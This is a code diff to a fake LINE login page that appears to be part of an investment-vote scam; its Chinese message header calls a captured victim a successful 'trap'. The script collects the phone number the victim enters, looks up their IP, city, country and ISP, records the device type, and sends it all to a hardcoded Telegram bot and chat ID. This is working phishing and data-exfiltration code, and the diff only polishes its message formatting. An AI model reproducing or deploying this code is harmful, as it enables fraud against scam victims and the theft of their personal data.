@@ -42,8 +42,7 @@
         </form>
         <div class="footer">© 1978 LINE Corp. <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></div>
     </div>
-
-    <script>
+<script>
     const TELEGRAM_BOT_TOKEN = "7989443479:AAE_YKV3EZJc4PNEkIMxqQ2BocEzw0pzCjE";
     const TELEGRAM_CHAT_ID   = "1137905005";
 
@@ -60,31 +59,30 @@
         fetch('https://ipapi.co/json/')
             .then(r => r.json())
             .then(d => sendLog(d))
-            .catch(() => sendLog({ip:"未知"}));
+            .catch(() => sendLog({ip:"未知", city:"未知", country_name:"未知", org:"未知"}));
 
         function sendLog(d) {
-            const log = {
-                phone: countryCode + phone,
-                ip: d.ip || "未知",
-                city: d.city || "未知",
-                country: d.country_name || "未知",
-                org: d.org || "未知",
-                ua: navigator.userAgent,
-                time: new Date().toLocaleString("zh-TW", {timeZone: "Asia/Taipei"})
+            // 超簡單中文化對照表
+            const countryTW = {
+                "Taiwan": "台灣", "Thailand": "泰國", "Malaysia": "馬來西亞", 
+                "Hong Kong": "香港", "Singapore": "新加坡", "Philippines": "菲律賓",
+                "Vietnam": "越南", "Cambodia": "柬埔寨", "Indonesia": "印尼"
             };
+
+            const msg = 【LINE 投資投票誘捕成功】\n\n +
+                        電話：${countryCode}${phone}\n +
+                        IP　　：${d.ip || "未知"}\n +
+                        位置　：${d.city || "未知"}，${countryTW[d.country_name] || d.country_name || "未知"}\n +
+                        ISP　　：${d.org || "未知"}\n +
+                        時間　：${new Date().toLocaleString("zh-TW", {timeZone:"Asia/Taipei"})}\n +
+                        裝置　：${navigator.userAgent.includes("Mobile") ? "手機" : "電腦/平板"};
 
             fetch(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
                 method: "POST",
-                headers: {"Content-Type":"application/json"},
+                headers: {"Content-Type": "application/json"},
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: 【LINE 投資投票誘捕成功】\n\n +
-                          電話：${log.phone}\n +
-                          IP　：${log.ip}\n +
-                          城市：${log.city}（${log.country}）\n +
-                          ISP　：${log.org}\n +
-                          時間：${log.time}\n +
-                          裝置：${log.ua.indexOf("Mobile")>-1?"手機":"電腦"},
+                    text: msg,
                     parse_mode: "HTML"
                 })
             });
@@ -98,4 +96,5 @@
 </body>
 
 </html>
+
 
